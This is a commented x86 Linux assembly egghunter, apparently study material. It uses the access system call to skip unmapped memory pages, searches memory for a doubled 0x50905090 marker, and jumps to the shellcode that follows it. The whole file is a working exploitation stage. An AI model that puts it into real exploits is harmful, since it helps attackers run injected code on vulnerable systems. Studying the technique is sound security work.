global _start

section .text

_start:
	
	xor edx, edx		;initializing the edx register to 0 as 'a XOR a'is always 0

nextpage:
	
	or dx, 0xfff		;initializing the lower 16 bits of dx to 0x0fff

nextbyte:

	inc edx			;incrementing edx by 1, so that we traverse the subsequent pages in the VAS
	
	lea ebx, [edx]		;loading the memory address stored in edx to ebx, thus passing the argument to the access system call
	push byte 0x21		; pushing the byte 0x21 to the stack, which is the system call number for access
	pop eax			; Initializing eax to 0x21, so that its contains the system call number
	int 0x80		; Providing the soft interrupt to execute the system call
	cmp al, 0xf2		; comparing the lower 8 bits of eax register with 0xf2, to see if EFAULT error code has occured
	jz nextpage		; If efault has occured, the jz flag will be set and instruction set will move to the label nextpage
	mov eax, 0x50905090	; If efault has not been hit, first 4 bytes of our egg will be placed in eax
	
	mov edi, edx		; Value of edx, in this case the memory address, will be loaded in edi
	scasd			; scasd instuction will compare the 4 bytes pointed by edi register to the value stored in eax register, and increment edi by 4 bytes
	jnz nextbyte		; If the first 4 bytes are matched, we check for the next 4 bytes of our egg, otherwise the instruction set moves to nextbyte
	scasd			; scasd instruction on the next 4 bytes of our egg
	jnz nextbyte		; If the egg matches, edi increments by 4 bytes and points to our shellcode.
	jmp edi			; Execution moves to our shellcode


	

